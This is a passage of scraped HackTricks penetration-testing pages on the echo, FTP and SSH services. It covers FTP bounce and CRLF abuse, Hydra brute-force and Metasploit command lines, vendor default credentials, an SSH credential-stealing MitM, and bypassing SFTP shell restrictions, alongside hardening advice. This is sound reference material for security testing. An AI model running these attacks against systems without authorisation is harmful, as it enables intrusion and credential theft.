üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nSIP (Session Initiation Protocol)\nNext\n- Network Services Pentesting\n7/tcp/udp - Pentesting Echo\nLast modified\n6mo ago"
    },
    {
        "title": "7/tcp/udp - Pentesting Echo",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/7-tcp-udp-pentesting-echo",
        "text": "7/tcp/udp - Pentesting Echo\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nAn echo service is running on this host. The echo service was intended for testing and measurement purposes and may listen on both TCP and UDP protocols. The server sends back any data it receives, with no modification.\nIt's possible to cause a denial of service by connecting the a echo service to the echo service on the same or another machine\n. Because of the excessively high number of packets produced, the affected machines may be effectively taken out of service.\nInfo from\nhttps://www.acunetix.com/vulnerabilities/web/echo-service-running/\n‚Äã\nDefault Port:\n7/tcp/udp\nPORT   STATE SERVICE\n7/udp  open  echo\n7/tcp  open  echo\nContact Echo service (UDP)\nnc\n-uvn\n<\nIP\n>\n7\nHello\necho\n#This is wat you send\nHello\necho\n#This is the response\nShodan\nport:7 echo\nReferences\n‚Äã\nWikipedia echo\n‚Äã\n‚Äã\nCA-1996-01 UDP Port Denial-of-Service Attack\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\nPentesting Remote GdbServer\nNext\n- Network Services Pentesting\n21 - Pentesting FTP\nLast modified\n6mo ago"
    },
    {
        "title": "21 - Pentesting FTP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp",
        "text": "21 - Pentesting FTP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nBasic Information\nThe\nFile Transfer Protocol (FTP\n) is a standard network protocol used for the transfer of computer files between a client and server on a computer network.\nIt is a\nplain-text\nprotocol that uses as\nnew line character\n0x0d 0x0a\nso sometimes you need to\nconnect using\ntelnet\nor\nnc -C\n.\nDefault Port:\n21\nPORT   STATE SERVICE\n21/tcp open  ftp\nConnections Active & Passive\nIn\nActive FTP\nthe FTP\nclient\nfirst\ninitiates\nthe control\nconnection\nfrom its port N to FTP Servers command port ‚Äì port 21. The\nclient\nthen\nlistens\nto port\nN+1\nand sends the port N+1 to FTP Server. FTP\nServer\nthen\ninitiates\nthe data\nconnection\n, from\nits port M to the port N+1\nof the FTP Client.\nBut, if the FTP Client has a firewall setup that controls the incoming data connections from outside, then active FTP may be a problem. And, a feasible solution for that is Passive FTP.\nIn\nPassive FTP\n, the client initiates the control connection from its port N to the port 21 of FTP Server. After this, the client issues a\npassv comand\n. The server then sends the client one of its port number M. And the\nclient\ninitiates\nthe data\nconnection\nfrom\nits port P to port M\nof the FTP Server.\nSource:\nhttps://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/\n‚Äã\nConnection debugging\nThe\nFTP\ncommands\ndebug\nand\ntrace\ncan be used to see\nhow is the communication occurring\n.\nEnumeration\nBanner Grabbing\nnc\n-vn\n<\nIP\n>\n21\nopenssl s_client\n-connect\ncrossfit.htb:21\n-starttls\nftp\n#Get certificate if any\nConnect to FTP using starttls\nlftp\nlftp :~> set ftp:ssl-force true\nlftp :~> set ssl:verify-certificate no\nlftp :~> connect 10.10.10.208\nlftp 10.10.10.208:~> login\nUsage: login <user|URL> [<pass>]\nlftp 10.10.10.208:~> login username Password\nUnauth enum\nWith\nnmap\nsudo\nnmap\n-sV\n-p21\n-sC\n-A\n10.10\n.10.10\nYou can us the commands\nHELP\nand\nFEAT\nto obtain some information of the FTP server:\nHELP\n214-The following commands are recognized (* =>'s unimplemented):\n214-CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV\n214-EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD\n214-XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP\n214-NOOP    FEAT    OPTS    AUTH    CCC*    CONF*   ENC*    MIC*\n214-PBSZ    PROT    TYPE    STRU    MODE    RETR    STOR    STOU\n214-APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST\n214-NLST    STAT    SITE    MLSD    MLST\n214 Direct comments to\n[email¬†protected]\n‚Äã\nFEAT\n211-Features:\nPROT\nCCC\nPBSZ\nAUTH TLS\nMFF modify;UNIX.group;UNIX.mode;\nREST STREAM\nMLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;\nUTF8\nEPRT\nEPSV\nLANG en-US\nMDTM\nSSCN\nTVFS\nMFMT\nSIZE\n211 End\n‚Äã\nSTAT\n#Info about the FTP server (version, configs, status...)\nAnonymous login\nanonymous : anonymous\nanonymous :\nftp : ftp\nftp\n<\nIP\n>\n>\nanonymous\n>\nanonymous\n>\nls\n-a\n# List all files (even hidden) (yes, they could be hidden)\n>\nbinary\n#Set transmission to binary instead of ascii\n>\nascii\n#Set transmission to ascii instead of binary\n>\nbye\n#exit\n‚Äã\nBrute force\n‚Äã\nHere you can find a nice list with default ftp credentials:\nhttps://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt\n‚Äã\nAutomated\nAnon login and bounce FTP checks are perform by default by nmap with\n-sC\noption or:\nnmap\n--script\nftp-*\n-p\n21\n<\nip\n>\nBrowser connection\nYou can connect to a FTP server using a browser (like Firefox) using a URL like:\nftp://anonymous:\n[email¬†protected]\nNote that if a\nweb application\nis sending data controlled by a user\ndirectly to a FTP server\nyou can send double URL encode\n%0d%0a\n(in double URL encode this is\n%250d%250a\n) bytes and make the\nFTP server perform arbitrary actions\n. One of this possible arbitrary actions is to download content from a users controlled server, perform port scanning or try to talk to other plain-text based services (like http).\nDownload all files from FTP\nwget\n-m\nftp://anonymous:\n[email¬†protected]\n#Donwload all\nwget\n-m\n--no-passive ftp://anonymous:\n[email¬†protected]\n#Download all\nIf your user/password has special characters, the\nfollowing command\ncan be used:\nwget\n-r\n--user\n=\n\"USERNAME\"\n--password\n=\n\"PASSWORD\"\nftp://server.com/\nSome FTP commands\nUSER username\nPASS password\nHELP\nThe server indicates which commands are supported\n**\nPORT 127,0,0,1,0,80\n**This will indicate the FTP server to establish a connection with the IP 127.0.0.1 in port 80 (\nyou need to put the 5th char as \"0\" and the 6th as the port in decimal or use the 5th and 6th to express the port in hex\n).\n**\nEPRT |2|127.0.0.1|80|\n**This will indicate the FTP server to establish a TCP connection (\nindicated by \"2\"\n) with the IP 127.0.0.1 in port 80. This command\nsupports IPv6\n.\nLIST\nThis will send the list of files in current folder\nLIST -R\nList recursively (if allowed by the server)\nAPPE /path/something.txt\nThis will indicate the FTP to store the data received from a\npassive\nconnection or from a\nPORT/EPRT\nconnection to a file. If the filename exists, it will append the data.\nSTOR /path/something.txt\nLike\nAPPE\nbut it will overwrite the files\nSTOU /path/something.txt\nLike\nAPPE\n, but if exists it won't do anything.\nRETR /path/to/file\nA passive or a port connection must be establish. Then, the FTP server will send the indicated file through that connection\nREST 6\nThis will indicate the server that next time it send something using\nRETR\nit should start in the 6th byte.\nTYPE i\nSet transfer to binary\nPASV\nThis will open a passive connection and will indicate the user were he can connects\nPUT /tmp/file.txt\nUpload indicated file to the FTP\nFTPBounce attack\nSome FTP servers allow the command PORT. This command can be used to indicate to the server that you wants to connect to other FTP server at some port. Then, you can use this to scan which ports of a host are open through a FTP server.\n‚Äã\nLearn here how to abuse a FTP server to scan ports.\n‚Äã\nYou could also abuse this behaviour to make a FTP server interact with other protocols. You could\nupload a file containing an HTTP request\nand make the vulnerable FTP server\nsend it to an arbitrary HTTP server\n(\nmaybe to add a new admin user?\n) or even upload a FTP request and make the vulnerable FTP server download a file for a different FTP server.\nThe theory is easy:\n1.\nUpload the request (inside a text file) to the vulnerable server.\nRemember that if you want to talk with another HTTP or FTP server you need to change lines with\n0x0d 0x0a\n2.\nUse\nREST X\nto avoid sending the characters you don't want to send\n(maybe to upload the request inside the file you needed to put some image header at the beginning)\n3.\nUse\nPORT\nto connect to the arbitrary server and service\n4.\nUse\nRETR\nto send the saved request to the server.\nIts highly probably that this\nwill throw an error like\nSocket not writable\nbecause the connection doesn't last enough to send the data with\nRETR\n. Suggestions to try to avoid that are:\nIf you are sending an HTTP request,\nput the same request one after another\nuntil\n~0.5MB\nat least. Like this:\nposts.txt\n495KB\nText\nposts.txt\nTry to\nfill the request with \"junk\" data relative to the protocol\n(talking to FTP maybe just junk commands or repeating the\nRETR\ninstruction to get the file)\nJust\nfill the request with a lot of null characters or others\n(divided on lines or not)\nAnyway, here you have an\nold example about how to abuse this to make a FTP server download a file from a different FTP server.\n‚Äã\nFilezilla Server Vulnerability\nFileZilla\nusually\nbinds\nto\nlocal\nan\nAdministrative service\nfor the\nFileZilla-Server\n(port 14147). If you can create a\ntunnel\nfrom\nyour machine\nto access this port, you can\nconnect\nto\nit\nusing a\nblank password\nand\ncreate\na\nnew user\nfor the FTP service.\nConfig files\nftpusers\nftp.conf\nproftpd.conf\nvsftpd.conf\nPost-Exploitation\nThe default configuration of vsFTPd can be found in\n/etc/vsftpd.conf\n. In here, you could find some dangerous settings:\nanonymous_enable=YES\nanon_upload_enable=YES\nanon_mkdir_write_enable=YES\nanon_root=/home/username/ftp\n- Directory for anonymous.\nchown_uploads=YES\n- Change ownership of anonymously uploaded files\nchown_username=username\n- User who is given ownership of anonymously uploaded files\nlocal_enable=YES\n- Enable local users to login\nno_anon_password=YES\n- Do not ask anonymous for password\nwrite_enable=YES\n- Allow commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE\nShodan\nftp\nport:21\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nHackTricks Automatic Commands\nProtocol_Name: FTP    #Protocol Abbreviation if there is one.\nPort_Number:  21     #Comma separated if there is more than one.\nProtocol_Description: File Transfer Protocol          #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for FTP\nNote: |\nAnonymous Login\n-bi     <<< so that your put is done via binary\n‚Äã\nwget --mirror 'ftp://ftp_user:UTDRSCH53c\"\n[email¬†protected]\n'\n^^to download all dirs and files\n‚Äã\nwget --no-passive-ftp --mirror 'ftp://anonymous:\n[email¬†protected]\n'\nif PASV transfer is disabled\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-ftp\n‚Äã\nEntry_2:\nName: Banner Grab\nDescription: Grab FTP Banner via telnet\nCommand: telnet -n {IP} 21\n‚Äã\nEntry_3:\nName: Cert Grab\nDescription: Grab FTP Certificate if existing\nCommand: openssl s_client -connect {IP}:21 -starttls ftp\n‚Äã\nEntry_4:\nName: nmap ftp\nDescription: Anon login and bounce FTP checks are performed\nCommand: nmap --script ftp-* -p 21 {IP}\n‚Äã\nEntry_5:\nName: Browser Connection\nDescription: Connect with Browser\nNote: ftp://anonymous:anonymous@{IP}\n‚Äã\nEntry_6:\nName: Hydra Brute Force\nDescription: Need Username\nCommand: hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV {IP} ftp\nEntry_7:\nName: consolesless mfs enumeration ftp\nDescription: FTP enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' &&  msfconsole -q -x 'use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS {IP}; set RPORT 21; run; exit'\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n7/tcp/udp - Pentesting Echo\nNext\nFTP Bounce attack - Scan\nLast modified\n20d ago"
    },
    {
        "title": "22 - Pentesting SSH/SFTP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh",
        "text": "22 - Pentesting SSH/SFTP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\n‚Äã\nIf you are interested in\nhacking career\nand hack the unhackable -\nwe are hiring!\n(\nfluent polish written and spoken required\n).\nCareers | stmcyber.com | penetration testing\nstmcyber.com\nBasic Information\nSSH or Secure Shell or Secure Socket Shell,\nis a network protocol that gives users a\nsecure way to access a computer over an unsecured network.\nDefault port:\n22\n22/tcp open  ssh     syn-ack\nSSH servers:\n‚Äã\nopenSSH\n‚Äì OpenBSD SSH, shipped in BSD, Linux distributions and Windows since Windows 10\n‚Äã\nDropbear\n‚Äì SSH implementation for environments with low memory and processor resources, shipped in OpenWrt\n‚Äã\nPuTTY\n‚Äì SSH implementation for Windows, the client is commonly used but the use of the server is rarer\n‚Äã\nCopSSH\n‚Äì implementation of OpenSSH for Windows\nSSH libraries (implementing server-side):\n‚Äã\nlibssh\n‚Äì multiplatform C library implementing the SSHv2 protocol with bindings in\nPython\n,\nPerl\nand\nR\n; it‚Äôs used by KDE for sftp and by GitHub for the git SSH infrastructure\n‚Äã\nwolfSSH\n‚Äì SSHv2 server library written in ANSI C and targeted for embedded, RTOS, and resource-constrained environments\n‚Äã\nApache MINA SSHD\n‚Äì Apache SSHD java library is based on Apache MINA\n‚Äã\nparamiko\n‚Äì Python SSHv2 protocol library\nEnumeration\nBanner Grabbing\nnc\n-vn\n<\nIP\n>\n22\nAutomated ssh-audit\nssh-audit is a tool for ssh server & client configuration auditing.\n‚Äã\nhttps://github.com/jtesta/ssh-audit\nis an updated fork from\nhttps://github.com/arthepsy/ssh-audit/\n‚Äã\nFeatures:\nSSH1 and SSH2 protocol server support;\nanalyze SSH client configuration;\ngrab banner, recognize device or software and operating system, detect compression;\ngather key-exchange, host-key, encryption and message authentication code algorithms;\noutput algorithm information (available since, removed/disabled, unsafe/weak/legacy, etc);\noutput algorithm recommendations (append or remove based on recognized software version);\noutput security information (related issues, assigned CVE list, etc);\nanalyze SSH version compatibility based on algorithm information;\nhistorical information from OpenSSH, Dropbear SSH and libssh;\nruns on Linux and Windows;\nno dependencies\nusage: ssh-audit.py\n[\n-1246pbcnjvlt\n]\n<\nhost\n>\n‚Äã\n-1,\n--ssh1\nforce\nssh\nversion\n1\nonly\n-2,\n--ssh2\nforce\nssh\nversion\n2\nonly\n-4,\n--ipv4\nenable\nIPv4\n(\norder of precedence\n)\n-6,\n--ipv6\nenable\nIPv6\n(\norder of precedence\n)\n-p,\n--port\n=<\nport\n>\nport to connect\n-b,\n--batch\nbatch output\n-c,  --client-audit     starts a server on port\n2222\nto audit client\nsoftware config\n(\nuse\n-p\nto change port\n;\nuse\n-t\nto change\ntimeout\n)\n-n,  --no-colors        disable colors\n-j,\n--json\nJSON output\n-v,\n--verbose\nverbose output\n-l,\n--level\n=<\nlevel\n>\nminimum output level\n(\ninfo\n|\nwarn\n|\nfail\n)\n-t,\n--timeout\n=<\nsecs\n>\ntimeout\n(\nin seconds\n)\nfor\nconnection and reading\n(\ndefault:\n5\n)\n$ python3 ssh-audit\n<\nIP\n>\n‚Äã\nSee it in action (Asciinema)\n‚Äã\nPublic SSH key of server\nssh-keyscan\n-t\nrsa\n<\nIP\n>\n-p\n<\nPORT\n>\nWeak Cipher Algorithms\nThis is discovered by default by\nnmap\n. But you can also use\nsslcan\nor\nsslyze\n.\nNmap scripts\nnmap\n-p22\n<\nip\n>\n-sC\n# Send default nmap scripts for SSH\nnmap\n-p22\n<\nip\n>\n-sV\n# Retrieve version\nnmap\n-p22\n<\nip\n>\n--script\nssh2-enum-algos\n# Retrieve supported algorythms\nnmap\n-p22\n<\nip\n>\n--script\nssh-hostkey --script-args\nssh_hostkey\n=\nfull\n# Retrieve weak keys\nnmap\n-p22\n<\nip\n>\n--script\nssh-auth-methods --script-args\n=\n\"ssh.user=root\"\n# Check authentication methods\nShodan\nssh\nBrute force usernames, passwords and private keys\nUsername Enumeration\nIn some versions of OpenSSH you can make a timing attack to enumerate users. You can use a metasploit module in order to exploit this:\nmsf> use scanner/ssh/ssh_enumusers\n‚Äã\nBrute force\n‚Äã\nSome common ssh credentials\nhere\nand\nhere\nand below.\nPrivate Key Brute Force\nIf you know some ssh private keys that could be used... let's try it. You can use the nmap script:\nhttps://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html\nOr the MSF auxiliary module:\nmsf> use scanner/ssh/ssh_identify_pubkeys\nOr use\nssh-keybrute.py\n(native python3, lightweight and has legacy algorithms enabled):\nsnowdroppe/ssh-keybrute\n.\nKnown badkeys can be found here:\nssh-badkeys/authorized at master ¬∑ rapid7/ssh-badkeys\nGitHub\nWeak SSH keys / Debian predictable PRNG\nSome systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced. Pre-generated sets of keys generated on Debian systems affected by weak PRNG are available here:\ng0tmi1k/debian-ssh\n.\nYou should look here in order to search for valid keys for the victim machine.\nKerberos\ncrackmapexec\nusing the\nssh\nprotocol can use the option\n--kerberos\nto\nauthenticate via kerberos\n.\nFor more info run\ncrackmapexec ssh --help\n.\nDefault Credentials\nVendor\nUsernames\nPasswords\nAPC\napc, device\napc\nBrocade\nadmin\nadmin123, password, brocade, fibranne\nCisco\nadmin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin\nadmin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme\nCitrix\nroot, nsroot, nsmaint, vdiadmin, kvm, cli, admin\nC1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler\nD-Link\nadmin, user\nprivate, admin, user\nDell\nroot, user1, admin, vkernel, cli\ncalvin, 123456, password, vkernel, Stor@ge!, admin\nEMC\nadmin, root, sysadmin\nEMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc\nHP/3Com\nadmin, root, vcx, app, spvar, manage, hpsupport, opc_op\nadmin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin\nHuawei\nadmin, root\n123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123\nIBM\nUSERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer\nPASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer\nJuniper\nnetscreen\nnetscreen\nNetApp\nadmin\nnetapp123\nOracle\nroot, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user\nchangeme, ilom-admin, ilom-operator, welcome1, oracle\nVMware\nvi-admin, root, hqadmin, vmware, admin\nvmware, vmw@re, hqadmin, default\nSSH-MitM\nIf you are in the local network as the victim which is going to connect to the SSH server using username and password you could try to\nperform a MitM attack to steal those credentials:\nAttack path:\nuser traffic is redirected to the attacking machine\nthe attacker monitors attempts to connect to the SSH server and redirects them to its SSH server\nthe attacker's SSH server is configured, firstly, to log all entered data, including the user's password, and, secondly, send commands to the legitimate SSH server to which the user wants to connect, to execute them, and then return the results to the legitimate user\n****\nSSH MITM\n**** does exactly what is described above.\nIn order to capture perform the actual MitM you could use techniques like ARP spoofing, DNS spoofin or others described in the\nNetwork Spoofing attacks\n.\nConfig Misconfigurations\nRoot login\nBy default most SSH server implementation will allow root login, it is advised to disable it because if the credentials of this accounts leaks, attackers will get administrative privileges directly and this will also allow attackers to conduct bruteforce attacks on this account.\nHow to disable root login for openSSH:\n1.\nEdit SSH server configuration\nsudoedit /etc/ssh/sshd_config\n2.\nChange\n#PermitRootLogin yes\ninto\nPermitRootLogin no\n3.\nTake into account configuration changes:\nsudo systemctl daemon-reload\n4.\nRestart the SSH server\nsudo systemctl restart sshd\nSFTP command execution\nAnother common SSH misconfiguration is often seen in SFTP configuration. Most of the time when creating a SFTP server the administrator want users to have a SFTP access to share files but not to get a remote shell on the machine. So they think that creating a user, attributing him a placeholder shell (like\n/usr/bin/nologin\nor\n/usr/bin/false\n) and chrooting him in a jail is enough to avoid a shell access or abuse on the whole file system. But they are wrong,\na user can ask to execute a command right after authentication before it‚Äôs default command or shell is executed\n. So to bypass the placeholder shell that will deny shell access, one only has to ask to execute a command (eg.\n/bin/bash\n) before, just by doing:\n$ ssh -v\n[email¬†protected]\nid\n...\nPassword:\ndebug1: Authentication succeeded (keyboard-interactive).\nAuthenticated to 192.168.1.94 ([192.168.1.94]:22).\ndebug1: channel 0: new [client-session]\ndebug1: Requesting\n[email¬†protected]\ndebug1: Entering interactive session.\ndebug1: pledge: network\ndebug1: client_input_global_request: rtype\n[email¬†protected]\nwant_reply 0\ndebug1: Sending command: id\ndebug1: client_input_channel_req: channel 0 rtype exit-status reply 0\ndebug1: client_input_channel_req: channel 0 rtype\n[email¬†protected]\nreply 0\nuid=1000(noraj) gid=100(users) groups=100(users)\ndebug1: channel 0: free: client-session, nchannels 1\nTransferred: sent 2412, received 2480 bytes, in 0.1 seconds\nBytes per second: sent 43133.4, received 44349.5\ndebug1: Exit status 0\n‚Äã\n$ ssh\n[email¬†protected]\n/bin/bash\nHere is an example of secure SFTP configuration (\n/etc/ssh/sshd_config\n‚Äì openSSH) for the user\nnoraj\n:\nMatch User noraj\nChrootDirectory %h\nForceCommand internal-sftp\nAllowTcpForwarding no\nPermitTunnel no\nX11Forwarding no\nPermitTTY no\nThis configuration will allow only SFTP: disabling shell access by forcing the start command and disabling TTY access but also disabling all kind of port forwarding or tunneling.\nSFTP Tunneling\nIf you have access to a SFTP server you can also tunnel your traffic through this for example using the common port forwarding:\nsudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>\nSFTP Symlink\nThe\nsftp\nhave the command \"\nsymlink\n\". Therefor, if you have\nwritable rights\nin some folder, you can create\nsymlinks\nof\nother folders/files\n. As you are probably\ntrapped\ninside a chroot this\nwon't be specially useful\nfor you, but, if you can\naccess\nthe created\nsymlink\nfrom a\nno-chroot\nservice\n(for example, if you can access the symlink from the web), you could\nopen the symlinked files through the web\n.\nFor example, to create a\nsymlink\nfrom a new file\n\"\nfroot\n\" to \"\n/\n\"\n:\nsftp> symlink / froot\nIf you can access the file \"\nfroot\n\" via web, you will be able to list the root (\"/\") folder of the system.\nAuthentication methods\nOn high security environment it‚Äôs a common practice to enable only key-based or two factor authentication rather than the simple factor password based authentication. But often the stronger authentication methods are enabled without disabling the weaker ones. A frequent case is enabling\npublickey\non openSSH configuration and setting it as the default method but not disabling\npassword\n. So by using the verbose mode of the SSH client an attacker can see that a weaker method is enabled:\n$ ssh -v 192.168.1.94\nOpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019\n...\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\nFor example if an authentication failure limit is set and you never get the chance to reach the password method, you can use the\nPreferredAuthentications\noption to force to use this method.\n$ ssh -v 192.168.1.94 -o PreferredAuthentications=password\n...\ndebug1: Next authentication method: password\nReview the SSH server configuration is necessary to check that only expected\nmethods are authorized. Using the verbose mode on the client can help to see\nthe effectiveness of the configuration.\nConfig files\nssh_config\nsshd_config\nauthorized_keys\nssh_known_hosts\nknown_hosts\nid_rsa\nFuzzing\n‚Äã\nhttps://packetstormsecurity.com/files/download/71252/sshfuzz.txt\n‚Äã\n‚Äã\nhttps://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2\n‚Äã\nReferences\nYou can find interesting guides on how to harden SSH in\nhttps://www.ssh-audit.com/hardening_guides.html\n‚Äã\n‚Äã\nhttps://community.turgensec.com/ssh-hacking-guide\n‚Äã\n‚Äã\n‚Äã\nIf you are interested in\nhacking career\nand hack the unhackable -\nwe are hiring!\n(\nfluent polish written and spoken required\n).\nCareers | stmcyber.com | penetration testing\nstmcyber.com\nHackTricks Automatic Commands\nProtocol_Name: SSH\nPort_Number: 22\nProtocol_Description: Secure Shell Hardening\n‚Äã\nEntry_1:\nName: Hydra Brute Force\nDescription: Need Username\nCommand: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh\nEntry_2:\nName: consolesless mfs enumeration\nDescription: SSH enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION 